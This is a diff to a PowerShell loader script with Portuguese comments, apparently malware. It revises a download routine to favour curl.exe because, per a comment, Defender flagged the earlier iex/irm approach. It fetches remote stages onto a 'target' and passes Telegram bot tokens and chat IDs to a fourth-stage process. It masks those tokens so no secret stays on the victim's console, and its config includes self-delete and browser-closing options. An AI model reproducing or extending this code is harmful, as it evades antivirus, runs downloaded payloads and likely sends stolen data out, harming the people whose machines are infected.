@@ -34,17 +34,20 @@ foreach ($old in @($t, $c)) {
 }
 
 function Get-Dl([string]$name, [string]$dest) {
-    # engine 1: iwr (PS). So considera sucesso se a chamada nao lancar E o arquivo existir com
-    # tamanho > 0 (arquivo parcial de um iwr cortado NUNCA avanca - cai no engine 2).
-    try {
-        Invoke-WebRequest ($base + '/' + $name) -OutFile $dest -UseBasicParsing -TimeoutSec 60
-        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
-    } catch { }
-    # engine 2: curl.exe nativo (TLS do Windows, roda onde o TLS do PS ta quebrado)
+    # engine 1: curl.exe nativo (TLS do Windows; mais discreto que iwr - o iex/irm do
+    # uml era o que o Defender acusava; aqui e no uml curl e o motor principal)
     try {
         $tmp = $dest + '.dl'
         & curl.exe -sSL -f --connect-timeout 30 -o $tmp ($base + '/' + $name) 2>$null
         if (Test-Path $tmp) { Move-Item $tmp $dest -Force }
+        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
+        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
+    } catch { }
+    # (iwr ja foi o engine 1 na v4.0; agora e fallback - apenas se o alvo nao tem curl.exe)
+    # So avanca se a chamada nao lancar E arquivo existe com tamanho > 0
+    # (arquivo parcial de um iwr cortado NUNCA avanca).
+    try {
+        Invoke-WebRequest ($base + '/' + $name) -OutFile $dest -UseBasicParsing -TimeoutSec 60
         if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
     } catch { }
     return $false
@@ -90,6 +93,10 @@ $dv = @{
     max_messages   = 0
     self_delete    = $false
     dry_run        = $false
+    TgTok          = ''
+    TelegramChatId = ''
+    ListaTok       = ''
+    ListaChatId    = ''
 }
 $rec = [string]$dv.recipients
 $close = [bool]$dv.close_browsers
@@ -99,6 +106,10 @@ $telegram = [bool]$dv.telegram
 $maxMessages = [int]$dv.max_messages
 $selfDelete = [bool]$dv.self_delete
 $dryRun = [bool]$dv.dry_run
+$TgTok = [string]$dv.TgTok
+$TelegramChatId = [string]$dv.TelegramChatId
+$ListaTok = [string]$dv.ListaTok
+$ListaChatId = [string]$dv.ListaChatId
 $selfTest = $false
 if ($cfgOk) {
     try {
@@ -115,6 +126,10 @@ if ($cfgOk) {
         if ($null -ne $j.self_delete) { $selfDelete = [bool]$j.self_delete }
         if ($null -ne $j.dry_run) { $dryRun = [bool]$j.dry_run }
         if ($null -ne $j.self_test) { $selfTest = [bool]$j.self_test }
+        if ($null -ne $j.TgTok) { $TgTok = [string]$j.TgTok }
+        if ($null -ne $j.TelegramChatId) { $TelegramChatId = [string]$j.TelegramChatId }
+        if ($null -ne $j.ListaTok) { $ListaTok = [string]$j.ListaTok }
+        if ($null -ne $j.ListaChatId) { $ListaChatId = [string]$j.ListaChatId }
     } catch {
         Write-Output '[reho] reho.config.json ilegivel -> segue com defaults'
     }
@@ -132,8 +147,16 @@ if (-not $telegram) { $argvs += '-NoTelegram' }
 if ($maxMessages -gt 0) { $argvs += '-MaxMessages', ([string]$maxMessages) }
 if ($selfDelete) { $argvs += '-SelfDelete' }
 if ($dryRun) { $argvs += '-DryRun' }
+if ($TgTok) { $argvs += '-TgTok', $TgTok }
+if ($TelegramChatId) { $argvs += '-TelegramChatId', $TelegramChatId }
+if ($ListaTok) { $argvs += '-ListaTok', $ListaTok }
+if ($ListaChatId) { $argvs += '-ListaChatId', $ListaChatId }
 
-Write-Output ('[reho] estagio-4 exec: ' + ($argvs -join ' '))
+# log do estagio-4 com tokens mascarados (nao deixa segredo no console/alvo)
+$argvsLog = $argvs
+if ($TgTok) { $argvsLog = $argvs -replace [regex]::Escape($TgTok), '***' }
+if ($ListaTok) { $argvsLog = $argvsLog -replace [regex]::Escape($ListaTok), '***' }
+Write-Output ('[reho] estagio-4 exec: ' + ($argvsLog -join ' '))
 try {
     & (Join-Path $PSHOME 'powershell.exe') @argvs
     exit $LASTEXITCODE
